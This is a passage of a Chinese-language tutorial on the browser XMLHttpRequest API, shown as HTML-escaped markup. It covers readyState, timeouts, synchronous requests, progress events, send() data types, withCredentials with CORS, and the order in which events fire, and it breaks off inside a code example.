&lt;li&gt;只有当 &lt;code&gt;responseType&lt;/code&gt; 为&lt;code&gt;&amp;quot;text&amp;quot;&lt;/code&gt;、&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;时，&lt;code&gt;xhr&lt;/code&gt;对象上才有此属性，此时才能调用&lt;code&gt;xhr.responseText&lt;/code&gt;，否则抛错&lt;/li&gt;
&lt;li&gt;只有当请求成功时，才能拿到正确值。以下2种情况下值都为空字符串&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;：请求未完成、请求失败&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xhr.responseXML&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;默认值为 &lt;code&gt;null&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只有当 &lt;code&gt;responseType&lt;/code&gt; 为&lt;code&gt;&amp;quot;text&amp;quot;&lt;/code&gt;、&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;、&lt;code&gt;&amp;quot;document&amp;quot;&lt;/code&gt;时，&lt;code&gt;xhr&lt;/code&gt;对象上才有此属性，此时才能调用&lt;code&gt;xhr.responseXML&lt;/code&gt;，否则抛错&lt;/li&gt;
&lt;li&gt;只有当请求成功且返回数据被正确解析时，才能拿到正确值。以下3种情况下值都为&lt;code&gt;null&lt;/code&gt;：请求未完成、请求失败、请求成功但返回数据无法被正确解析时&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;如何追踪ajax请求的当前状态&#34;&gt;如何追踪&lt;code&gt;ajax&lt;/code&gt;请求的当前状态&lt;/h3&gt;
&lt;p&gt;在发一个&lt;code&gt;ajax&lt;/code&gt;请求后，如果想追踪请求当前处于哪种状态，该怎么做呢？&lt;/p&gt;
&lt;p&gt;用&lt;code&gt;xhr.readyState&lt;/code&gt;这个属性即可追踪到。这个属性是只读属性，总共有5种可能值，分别对应&lt;code&gt;xhr&lt;/code&gt;不同的不同阶段。每次&lt;code&gt;xhr.readyState&lt;/code&gt;的值发生变化时，都会触发&lt;code&gt;xhr.onreadystatechange&lt;/code&gt;事件，我们可以在这个事件中进行相关状态判断。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  xhr.onreadystatechange = function () {
    switch(xhr.readyState){
      case 1://OPENED
        //do something
            break;
      case 2://HEADERS_RECEIVED
        //do something
        break;
      case 3://LOADING
        //do something
        break;
      case 4://DONE
        //do something
        break;
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;值&lt;/th&gt;
&lt;th&gt;状态&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;UNSENT&lt;/code&gt; (初始状态，未打开)&lt;/td&gt;
&lt;td&gt;此时&lt;code&gt;xhr&lt;/code&gt;对象被成功构造，&lt;code&gt;open()&lt;/code&gt;方法还未被调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;OPENED&lt;/code&gt; (已打开，未发送)&lt;/td&gt;
&lt;td&gt;&lt;code&gt;open()&lt;/code&gt;方法已被成功调用，&lt;code&gt;send()&lt;/code&gt;方法还未被调用。注意：只有&lt;code&gt;xhr&lt;/code&gt;处于&lt;code&gt;OPENED&lt;/code&gt;状态，才能调用&lt;code&gt;xhr.setRequestHeader()&lt;/code&gt;和&lt;code&gt;xhr.send()&lt;/code&gt;,否则会报错&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;2&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;HEADERS_RECEIVED&lt;/code&gt; (已获取响应头)&lt;/td&gt;
&lt;td&gt;&lt;code&gt;send()&lt;/code&gt;方法已经被调用, 响应头和响应状态已经返回&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;3&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LOADING&lt;/code&gt; (正在下载响应体)&lt;/td&gt;
&lt;td&gt;响应体(&lt;code&gt;response entity body&lt;/code&gt;)正在下载中，此状态下通过&lt;code&gt;xhr.response&lt;/code&gt;可能已经有了响应数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;4&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;DONE&lt;/code&gt; (整个数据传输过程结束)&lt;/td&gt;
&lt;td&gt;整个数据传输过程结束，不管本次请求是成功还是失败&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;如何设置请求的超时时间&#34;&gt;如何设置请求的超时时间&lt;/h3&gt;
&lt;p&gt;如果请求过了很久还没有成功，为了不会白白占用的网络资源，我们一般会主动终止请求。&lt;code&gt;XMLHttpRequest&lt;/code&gt;提供了&lt;code&gt;timeout&lt;/code&gt;属性来允许设置请求的超时时间。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;xhr.timeout
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;单位：milliseconds 毫秒&lt;br&gt;
默认值：&lt;code&gt;0&lt;/code&gt;，即不设置超时&lt;/p&gt;
&lt;p&gt;很多同学都知道：从*&lt;strong&gt;请求开始*&lt;/strong&gt; 算起，若超过 &lt;code&gt;timeout&lt;/code&gt; 时间请求还没有结束（包括成功/失败），则会触发ontimeout事件，主动结束该请求。&lt;/p&gt;
&lt;p&gt;【那么到底什么时候才算是*&lt;strong&gt;请求开始*&lt;/strong&gt; ？】&lt;br&gt;
——&lt;code&gt;xhr.onloadstart&lt;/code&gt;事件触发的时候，也就是你调用&lt;code&gt;xhr.send()&lt;/code&gt;方法的时候。&lt;br&gt;
因为&lt;code&gt;xhr.open()&lt;/code&gt;只是创建了一个连接，但并没有真正开始数据的传输，而&lt;code&gt;xhr.send()&lt;/code&gt;才是真正开始了数据的传输过程。只有调用了&lt;code&gt;xhr.send()&lt;/code&gt;，才会触发&lt;code&gt;xhr.onloadstart&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;【那么什么时候才算是*&lt;strong&gt;请求结束*&lt;/strong&gt; ？】&lt;br&gt;
—— &lt;code&gt;xhr.loadend&lt;/code&gt;事件触发的时候。&lt;/p&gt;
&lt;p&gt;另外，还有2个需要注意的坑儿：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以在 &lt;code&gt;send()&lt;/code&gt;之后再设置此&lt;code&gt;xhr.timeout&lt;/code&gt;，但计时起始点仍为调用&lt;code&gt;xhr.send()&lt;/code&gt;方法的时刻。&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;xhr&lt;/code&gt;为一个&lt;code&gt;sync&lt;/code&gt;同步请求时，&lt;code&gt;xhr.timeout&lt;/code&gt;必须置为&lt;code&gt;0&lt;/code&gt;，否则会抛错。原因可以参考本文的【如何发一个同步请求】一节。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;如何发一个同步请求&#34;&gt;如何发一个同步请求&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;xhr&lt;/code&gt;默认发的是异步请求，但也支持发同步请求（当然实际开发中应该尽量避免使用）。到底是异步还是同步请求，由&lt;code&gt;xhr.open（）&lt;/code&gt;传入的&lt;code&gt;async&lt;/code&gt;参数决定。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;open(method, url [, async = true [, username = null [, password = null]]])
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;method&lt;/code&gt;: 请求的方式，如&lt;code&gt;GET/POST/HEADER&lt;/code&gt;等，这个参数不区分大小写&lt;/li&gt;
&lt;li&gt;&lt;code&gt;url&lt;/code&gt;: 请求的地址，可以是相对地址如&lt;code&gt;example.php&lt;/code&gt;，这个&lt;strong&gt;相对&lt;/strong&gt;是相对于当前网页的&lt;code&gt;url&lt;/code&gt;路径；也可以是绝对地址如&lt;code&gt;http://www.example.com/example.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;async&lt;/code&gt;: 默认值为&lt;code&gt;true&lt;/code&gt;，即为异步请求，若&lt;code&gt;async=false&lt;/code&gt;，则为同步请求&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在我认真研读W3C 的 xhr 标准前，我总以为同步请求和异步请求只是阻塞和非阻塞的区别，其他什么事件触发、参数设置应该是一样的，事实证明我错了。&lt;/p&gt;
&lt;p&gt;W3C 的 xhr标准中关于&lt;code&gt;open()&lt;/code&gt;方法有这样一段说明：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Throws an &amp;quot;InvalidAccessError&amp;quot; exception if async is false, the JavaScript global environment is a document environment, and either the timeout attribute is not zero, the withCredentials attribute is true, or the responseType attribute is not the empty string.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;从上面一段说明可以知道，当&lt;code&gt;xhr&lt;/code&gt;为同步请求时，有如下限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;xhr.timeout&lt;/code&gt;必须为&lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xhr.withCredentials&lt;/code&gt;必须为 &lt;code&gt;false&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xhr.responseType&lt;/code&gt;必须为&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;（注意置为&lt;code&gt;&amp;quot;text&amp;quot;&lt;/code&gt;也不允许）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;若上面任何一个限制不满足，都会抛错，而对于异步请求，则没有这些参数设置上的限制。&lt;/p&gt;
&lt;p&gt;之前说过页面中应该尽量避免使用&lt;code&gt;sync&lt;/code&gt;同步请求，为什么呢？&lt;br&gt;
因为我们无法设置请求超时时间（&lt;code&gt;xhr.timeout&lt;/code&gt;为&lt;code&gt;0&lt;/code&gt;，即不限时）。在不限制超时的情况下，有可能同步请求一直处于&lt;code&gt;pending&lt;/code&gt;状态，服务端迟迟不返回响应，这样整个页面就会一直阻塞，无法响应用户的其他交互。&lt;/p&gt;
&lt;p&gt;另外，标准中并没有提及同步请求时事件触发的限制，但实际开发中我确实遇到过部分应该触发的事件并没有触发的现象。如在 chrome中，当&lt;code&gt;xhr&lt;/code&gt;为同步请求时，在&lt;code&gt;xhr.readyState&lt;/code&gt;由&lt;code&gt;2&lt;/code&gt;变成&lt;code&gt;3&lt;/code&gt;时，并不会触发 &lt;code&gt;onreadystatechange&lt;/code&gt;事件，&lt;code&gt;xhr.upload.onprogress&lt;/code&gt;和 &lt;code&gt;xhr.onprogress&lt;/code&gt;事件也不会触发。&lt;/p&gt;
&lt;h3 id=&#34;如何获取上传-下载的进度&#34;&gt;如何获取上传、下载的进度&lt;/h3&gt;
&lt;p&gt;在上传或者下载比较大的文件时，实时显示当前的上传、下载进度是很普遍的产品需求。&lt;br&gt;
我们可以通过&lt;code&gt;onprogress&lt;/code&gt;事件来实时显示进度，默认情况下这个事件每50ms触发一次。需要注意的是，上传过程和下载过程触发的是不同对象的&lt;code&gt;onprogress&lt;/code&gt;事件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;上传触发的是&lt;code&gt;xhr.upload&lt;/code&gt;对象的 &lt;code&gt;onprogress&lt;/code&gt;事件&lt;/li&gt;
&lt;li&gt;下载触发的是&lt;code&gt;xhr&lt;/code&gt;对象的&lt;code&gt;onprogress&lt;/code&gt;事件&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;xhr.onprogress = updateProgress;
xhr.upload.onprogress = updateProgress;
function updateProgress(event) {
    if (event.lengthComputable) {
      var completedPercent = event.loaded / event.total;
    }
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;可以发送什么类型的数据&#34;&gt;可以发送什么类型的数据&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;void send(data);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;xhr.send(data)&lt;/code&gt;的参数data可以是以下几种类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ArrayBuffer&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Blob&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Document&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DOMString&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;FormData&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;null&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果是 GET/HEAD请求，&lt;code&gt;send()&lt;/code&gt;方法一般不传参或传 &lt;code&gt;null&lt;/code&gt;。不过即使你真传入了参数，参数也最终被忽略，&lt;code&gt;xhr.send(data)&lt;/code&gt;中的data会被置为 &lt;code&gt;null&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;xhr.send(data)&lt;/code&gt;中data参数的数据类型会影响请求头部&lt;code&gt;content-type&lt;/code&gt;的默认值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果&lt;code&gt;data&lt;/code&gt;是 &lt;code&gt;Document&lt;/code&gt; 类型，同时也是&lt;code&gt;HTML Document&lt;/code&gt;类型，则&lt;code&gt;content-type&lt;/code&gt;默认值为&lt;code&gt;text/html;charset=UTF-8&lt;/code&gt;;否则为&lt;code&gt;application/xml;charset=UTF-8&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;data&lt;/code&gt;是 &lt;code&gt;DOMString&lt;/code&gt; 类型，&lt;code&gt;content-type&lt;/code&gt;默认值为&lt;code&gt;text/plain;charset=UTF-8&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;data&lt;/code&gt;是 &lt;code&gt;FormData&lt;/code&gt; 类型，&lt;code&gt;content-type&lt;/code&gt;默认值为&lt;code&gt;multipart/form-data; boundary=[xxx]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;data&lt;/code&gt;是其他类型，则不会设置&lt;code&gt;content-type&lt;/code&gt;的默认值&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然这些只是&lt;code&gt;content-type&lt;/code&gt;的默认值，但如果用&lt;code&gt;xhr.setRequestHeader()&lt;/code&gt;手动设置了中&lt;code&gt;content-type&lt;/code&gt;的值，以上默认值就会被覆盖。&lt;/p&gt;
&lt;p&gt;另外需要注意的是，若在断网状态下调用&lt;code&gt;xhr.send(data)&lt;/code&gt;方法，则会抛错：&lt;code&gt;Uncaught NetworkError: Failed to execute &#39;send&#39; on &#39;XMLHttpRequest&#39;&lt;/code&gt;。一旦程序抛出错误，如果不 catch 就无法继续执行后面的代码，所以调用 &lt;code&gt;xhr.send(data)&lt;/code&gt;方法时，应该用 &lt;code&gt;try-catch&lt;/code&gt;捕捉错误。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;try{
    xhr.send(data)
  }catch(e) {
    //doSomething...
  };
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;xhrwithcredentials与-cors-什么关系&#34;&gt;&lt;code&gt;xhr.withCredentials&lt;/code&gt;与 &lt;code&gt;CORS&lt;/code&gt; 什么关系&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;我们都知道，在发同域请求时，浏览器会将&lt;code&gt;cookie&lt;/code&gt;自动加在&lt;code&gt;request header&lt;/code&gt;中。但大家是否遇到过这样的场景：在发送跨域请求时，&lt;code&gt;cookie&lt;/code&gt;并没有自动加在&lt;code&gt;request header&lt;/code&gt;中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;造成这个问题的原因是：在&lt;code&gt;CORS&lt;/code&gt;标准中做了规定，默认情况下，浏览器在发送跨域请求时，不能发送任何认证信息（&lt;code&gt;credentials&lt;/code&gt;）如&amp;quot;&lt;code&gt;cookies&lt;/code&gt;&amp;quot;和&amp;quot;&lt;code&gt;HTTP authentication schemes&lt;/code&gt;&amp;quot;。除非&lt;code&gt;xhr.withCredentials&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;（&lt;code&gt;xhr&lt;/code&gt;对象有一个属性叫&lt;code&gt;withCredentials&lt;/code&gt;，默认值为&lt;code&gt;false&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;所以根本原因是&lt;code&gt;cookies&lt;/code&gt;也是一种认证信息，在跨域请求中，&lt;code&gt;client&lt;/code&gt;端必须手动设置&lt;code&gt;xhr.withCredentials=true&lt;/code&gt;，且&lt;code&gt;server&lt;/code&gt;端也必须允许&lt;code&gt;request&lt;/code&gt;能携带认证信息（即&lt;code&gt;response header&lt;/code&gt;中包含&lt;code&gt;Access-Control-Allow-Credentials:true&lt;/code&gt;），这样浏览器才会自动将&lt;code&gt;cookie&lt;/code&gt;加在&lt;code&gt;request header&lt;/code&gt;中。&lt;/p&gt;
&lt;p&gt;另外，要特别注意一点，一旦跨域&lt;code&gt;request&lt;/code&gt;能够携带认证信息，&lt;code&gt;server&lt;/code&gt;端一定不能将&lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;设置为&lt;code&gt;*&lt;/code&gt;，而必须设置为请求页面的域名。&lt;/p&gt;
&lt;h2 id=&#34;xhr相关事件&#34;&gt;&lt;code&gt;xhr&lt;/code&gt;相关事件&lt;/h2&gt;
&lt;h3 id=&#34;事件分类&#34;&gt;事件分类&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;xhr&lt;/code&gt;相关事件有很多，有时记起来还挺容易混乱。但当我了解了具体代码实现后，就容易理清楚了。下面是&lt;code&gt;XMLHttpRequest&lt;/code&gt;的部分实现代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;interface XMLHttpRequestEventTarget : EventTarget {
  // event handlers
  attribute EventHandler onloadstart;
  attribute EventHandler onprogress;
  attribute EventHandler onabort;
  attribute EventHandler onerror;
  attribute EventHandler onload;
  attribute EventHandler ontimeout;
  attribute EventHandler onloadend;
};

interface XMLHttpRequestUpload : XMLHttpRequestEventTarget {

};

interface XMLHttpRequest : XMLHttpRequestEventTarget {
  // event handler
  attribute EventHandler onreadystatechange;
  readonly attribute XMLHttpRequestUpload upload;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从代码中我们可以看出：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;XMLHttpRequestEventTarget&lt;/code&gt;接口定义了7个事件：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;onloadstart&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;onprogress&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;onabort&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ontimeout&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;onerror&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;onload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;onloadend&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;每一个&lt;code&gt;XMLHttpRequest&lt;/code&gt;里面都有一个&lt;code&gt;upload&lt;/code&gt;属性，而&lt;code&gt;upload&lt;/code&gt;是一个&lt;code&gt;XMLHttpRequestUpload&lt;/code&gt;对象&lt;/li&gt;
&lt;li&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;和&lt;code&gt;XMLHttpRequestUpload&lt;/code&gt;都继承了同一个&lt;code&gt;XMLHttpRequestEventTarget&lt;/code&gt;接口，所以&lt;code&gt;xhr&lt;/code&gt;和&lt;code&gt;xhr.upload&lt;/code&gt;都有第一条列举的7个事件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;onreadystatechange&lt;/code&gt;是&lt;code&gt;XMLHttpRequest&lt;/code&gt;独有的事件&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以这么一看就很清晰了：&lt;br&gt;
&lt;code&gt;xhr&lt;/code&gt;一共有8个相关事件：7个&lt;code&gt;XMLHttpRequestEventTarget&lt;/code&gt;事件+1个独有的&lt;code&gt;onreadystatechange&lt;/code&gt;事件；而&lt;code&gt;xhr.upload&lt;/code&gt;只有7个&lt;code&gt;XMLHttpRequestEventTarget&lt;/code&gt;事件。&lt;/p&gt;
&lt;h3 id=&#34;事件触发条件&#34;&gt;事件触发条件&lt;/h3&gt;
&lt;p&gt;下面是我自己整理的一张&lt;code&gt;xhr&lt;/code&gt;相关事件触发条件表，其中最需要注意的是 &lt;code&gt;onerror&lt;/code&gt; 事件的触发条件。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;事件&lt;/th&gt;
&lt;th&gt;触发条件&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;onreadystatechange&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;每当&lt;code&gt;xhr.readyState&lt;/code&gt;改变时触发；但&lt;code&gt;xhr.readyState&lt;/code&gt;由非&lt;code&gt;0&lt;/code&gt;值变为&lt;code&gt;0&lt;/code&gt;时不触发。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;onloadstart&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;调用&lt;code&gt;xhr.send()&lt;/code&gt;方法后立即触发，若&lt;code&gt;xhr.send()&lt;/code&gt;未被调用则不会触发此事件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;onprogress&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;xhr.upload.onprogress&lt;/code&gt;在上传阶段(即&lt;code&gt;xhr.send()&lt;/code&gt;之后，&lt;code&gt;xhr.readystate=2&lt;/code&gt;之前)触发，每50ms触发一次；&lt;code&gt;xhr.onprogress&lt;/code&gt;在下载阶段（即&lt;code&gt;xhr.readystate=3&lt;/code&gt;时）触发，每50ms触发一次。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;onload&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;当请求成功完成时触发，此时&lt;code&gt;xhr.readystate=4&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;onloadend&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;当请求结束（包括请求成功和请求失败）时触发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;onabort&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;当调用&lt;code&gt;xhr.abort()&lt;/code&gt;后触发&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ontimeout&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;xhr.timeout&lt;/code&gt;不等于0，由请求开始即&lt;code&gt;onloadstart&lt;/code&gt;开始算起，当到达&lt;code&gt;xhr.timeout&lt;/code&gt;所设置时间请求还未结束即&lt;code&gt;onloadend&lt;/code&gt;，则触发此事件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;onerror&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;在请求过程中，若发生&lt;code&gt;Network error&lt;/code&gt;则会触发此事件（若发生&lt;code&gt;Network error&lt;/code&gt;时，上传还没有结束，则会先触发&lt;code&gt;xhr.upload.onerror&lt;/code&gt;，再触发&lt;code&gt;xhr.onerror&lt;/code&gt;；若发生&lt;code&gt;Network error&lt;/code&gt;时，上传已经结束，则只会触发&lt;code&gt;xhr.onerror&lt;/code&gt;）。&lt;strong&gt;注意&lt;/strong&gt;，只有发生了网络层级别的异常才会触发此事件，对于应用层级别的异常，如响应返回的&lt;code&gt;xhr.statusCode&lt;/code&gt;是&lt;code&gt;4xx&lt;/code&gt;时，并不属于&lt;code&gt;Network error&lt;/code&gt;，所以不会触发&lt;code&gt;onerror&lt;/code&gt;事件，而是会触发&lt;code&gt;onload&lt;/code&gt;事件。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;事件触发顺序&#34;&gt;事件触发顺序&lt;/h3&gt;
&lt;p&gt;当请求一切正常时，相关的事件触发顺序如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;触发&lt;code&gt;xhr.onreadystatechange&lt;/code&gt;(之后每次&lt;code&gt;readyState&lt;/code&gt;变化时，都会触发一次)&lt;/li&gt;
&lt;li&gt;触发&lt;code&gt;xhr.onloadstart&lt;/code&gt;&lt;br&gt;
//上传阶段开始：&lt;/li&gt;
&lt;li&gt;触发&lt;code&gt;xhr.upload.onloadstart&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;触发&lt;code&gt;xhr.upload.onprogress&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;触发&lt;code&gt;xhr.upload.onload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;触发&lt;code&gt;xhr.upload.onloadend&lt;/code&gt;&lt;br&gt;
//上传结束，下载阶段开始：&lt;/li&gt;
&lt;li&gt;触发&lt;code&gt;xhr.onprogress&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;触发&lt;code&gt;xhr.onload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;触发&lt;code&gt;xhr.onloadend&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;发生aborttimeouterror异常的处理&#34;&gt;发生&lt;code&gt;abort&lt;/code&gt;/&lt;code&gt;timeout&lt;/code&gt;/&lt;code&gt;error&lt;/code&gt;异常的处理&lt;/h4&gt;
&lt;p&gt;在请求的过程中，有可能发生 &lt;code&gt;abort&lt;/code&gt;/&lt;code&gt;timeout&lt;/code&gt;/&lt;code&gt;error&lt;/code&gt;这3种异常。那么一旦发生这些异常，&lt;code&gt;xhr&lt;/code&gt;后续会进行哪些处理呢？后续处理如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一旦发生&lt;code&gt;abort&lt;/code&gt;或&lt;code&gt;timeout&lt;/code&gt;或&lt;code&gt;error&lt;/code&gt;异常，先立即中止当前请求&lt;/li&gt;
&lt;li&gt;将 &lt;code&gt;readystate&lt;/code&gt; 置为&lt;code&gt;4&lt;/code&gt;，并触发 &lt;code&gt;xhr.onreadystatechange&lt;/code&gt;事件&lt;/li&gt;
&lt;li&gt;如果上传阶段还没有结束，则依次触发以下事件：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;xhr.upload.onprogress&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xhr.upload.[onabort或ontimeout或onerror]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xhr.upload.onloadend&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;触发 &lt;code&gt;xhr.onprogress&lt;/code&gt;事件&lt;/li&gt;
&lt;li&gt;触发 &lt;code&gt;xhr.[onabort或ontimeout或onerror]&lt;/code&gt;事件&lt;/li&gt;
&lt;li&gt;触发&lt;code&gt;xhr.onloadend&lt;/code&gt; 事件&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;在哪个xhr事件中注册成功回调&#34;&gt;在哪个&lt;code&gt;xhr&lt;/code&gt;事件中注册成功回调？&lt;/h4&gt;
&lt;p&gt;从上面介绍的事件中，可以知道若&lt;code&gt;xhr&lt;/code&gt;请求成功，就会触发&lt;code&gt;xhr.onreadystatechange&lt;/code&gt;和&lt;code&gt;xhr.onload&lt;/code&gt;两个事件。 那么我们到底要将成功回调注册在哪个事件中呢？我倾向于 &lt;code&gt;xhr.onload&lt;/code&gt;事件，因为&lt;code&gt;xhr.onreadystatechange&lt;/code&gt;是每次&lt;code&gt;xhr.readyState&lt;/code&gt;变化时都会触发，而不是&lt;code&gt;xhr.readyState=4&lt;/code&gt;时才触发。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;xhr.onload = function () {
    //如果请求成功
    if(xhr.status == 200){
      //do successCallback
    }
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的示例代码是很常见的写法：先判断&lt;code&gt;http&lt;/code&gt;状态码是否是&lt;code&gt;200&lt;/code&gt;，如果是，则认为请求是成功的，接着执行成功回调。这样的判断是有坑儿的，比如当返回的&lt;code&gt;http&lt;/code&gt;状态码不是&lt;code&gt;200&lt;/code&gt;，而是&lt;code&gt;201&lt;/code&gt;时，请求虽然也是成功的，但并没有执行成功回调逻辑。所以更靠谱的判断方法应该是：当&lt;code&gt;http&lt;/code&gt;状态码为&lt;code&gt;2xx&lt;/code&gt;或&lt;code&gt;304&lt;/code&gt;时才认为成功。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  xhr.onload = function () {
    //如果请求成功
